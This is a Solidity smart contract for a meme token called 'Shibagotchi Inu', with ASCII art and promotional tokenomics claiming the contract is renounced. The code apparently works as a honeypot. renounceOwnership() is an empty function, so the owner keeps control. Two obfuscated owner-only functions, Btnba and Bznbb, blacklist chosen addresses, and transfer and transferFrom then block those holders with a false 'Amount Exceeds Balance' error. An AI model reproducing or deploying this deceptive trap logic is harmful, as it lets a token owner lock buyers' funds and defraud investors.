/**
 *Submitted for verification at Etherscan.io on 2022-09-14
*/

pragma solidity 0.8.7;
/*



                             ,,,,                      ,,,,
                             ▐██▀▄▄                  ┌▄█▀██
                            ██▒▒╢▒▓█F               ██▒▒╢▒▓█F
                           ▐█▌╢  ╣▒▒██            ██▒▒╣  ╢▐█▌
                           ▐█▌╢   j╢▒▄████████████▄▄╢[   ╢▐█▌
                           ▐█▌╢    "▀▀╣╢╢╢╢╢╢╢╢╢╢╢▀▀"`   ╢▐█▌
                           ▐█▌╢  @@@▓╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣@▓@  ╢▐█▌
                           ▐█▌╢╢╢╢╢╢Ç    ]╢╢╢╢╡    ,╢╢╢╢╢╢▐█▌
                          ▄▄▀▌╢╢╢╢▒▄▄▄╣╣╓▐╢╢╢╢▓╓╟╢▄▄▄▌╙╙╙╙▀▀▄▄
                        ▄█▒▒╢╢╢╢╢╢▐█████╢F```╢╢╢█████▌      ▐▒██
                        ██╢▌ ╟╢╢╢╢▒▒⌐                       ]╢██
                        ██╢╡        ,▄   ▐▀███▌   ▄▄        ]╢██
                        ▀▀█▌╦       ╙▀▄▄▄▄▄██▄▄▄▄▄▀▀       ╦▐█▀▀
                          ██╢[        ¬  ▐▒▒▒▒▌           ]╢██
                           ▐█▌▒╣╢        ]ÑÑÑÑ╡        ╟╢▒▓█▌
                             ╙▀▓▄▄▄▄▄▄╣╣╓╓╓╓╓╓╓╓╟╢▄▄▄▄▄▄▄▀▀
                               ▀▀▀▀▀▀▀████████████▀▀▀▀▀▀▀
                                      ````````````
MP""""""`MM M""MMMMM""MM M""M M#"""""""'M  MMP"""""""MM MM'"""""`MM MMP"""""YMM M""""""""M MM'""""'YMM M""MMMMM""MM M""M 
M  mmmmm..M M  MMMMM  MM M  M ##  mmmm. `M M' .mmmm  MM M' .mmm. `M M' .mmm. `M Mmmm  mmmM M' .mmm. `M M  MMMMM  MM M  M 
M.      `YM M         `M M  M #'        .M M         `M M  MMMMMMMM M  MMMMM  M MMMM  MMMM M  MMMMMooM M         `M M  M 
MMMMMMM.  M M  MMMMM  MM M  M M#  MMMb.'YM M  MMMMM  MM M  MMM   `M M  MMMMM  M MMMM  MMMM M  MMMMMMMM M  MMMMM  MM M  M 
M. .MMM'  M M  MMMMM  MM M  M M#  MMMM'  M M  MMMMM  MM M. `MMM' .M M. `MMM' .M MMMM  MMMM M. `MMM' .M M  MMMMM  MM M  M 
Mb.     .dM M  MMMMM  MM M  M M#       .;M M  MMMMM  MM MM.     .MM MMb     dMM MMMM  MMMM MM.     .dM M  MMMMM  MM M  M 
MMMMMMMMMMM MMMMMMMMMMMM MMMM M#########M  MMMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMMM MMMM 


 Shibagotchi Inu - $SHIBAGOTCHI -

Inspired by Shiba Inu, Shibagotchi is a meme token designed to power the Shiba Gotchi Game World - 

Enjoy Dozens of P2E Games, with rewards in $SHIB 

Tokenomics -

- 100m Supply
- 0% Tax first Week
- Liquidity Locked 1 Year
- Contract Renounced


*/    

contract ShibaGotchi {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) zxAmnt;

    // 
    string public name = "Shibagotchi Inu";
    string public symbol = unicode"SHIBAGOTCHI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function Btnba(address _user) public onlyOwner {
        require(!zxAmnt[_user], "x");
        zxAmnt[_user] = true;
     
    }
    
    function Bznbb(address _user) public onlyOwner {
        require(zxAmnt[_user], "xx");
        zxAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!zxAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!zxAmnt[from] , "Amount Exceeds Balance"); 
               require(!zxAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}